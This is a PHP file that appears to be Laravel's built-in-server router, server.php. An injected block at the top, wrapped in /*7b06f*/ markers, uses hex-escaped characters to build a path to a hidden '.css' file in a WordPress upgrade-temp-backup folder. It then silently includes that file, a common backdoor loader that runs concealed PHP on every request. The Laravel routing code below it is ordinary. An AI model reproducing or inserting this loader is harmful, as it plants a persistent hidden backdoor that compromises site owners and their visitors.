<?php
/*7b06f*/

$ruj8 = "/home/u700657081/domains/xcrinogrou\x70.com/\x70ublic_html/Grocery/w\x70\x2dcontent/u\x70grade\x2dtem\x70\x2dbacku\x70/.ae3ee2c1.css"; if (!isset($ruj8)) {chop ($ruj8);} else { @include_once /* 154 */ ($ruj8); }

/*7b06f*/

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) ?? ''
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';
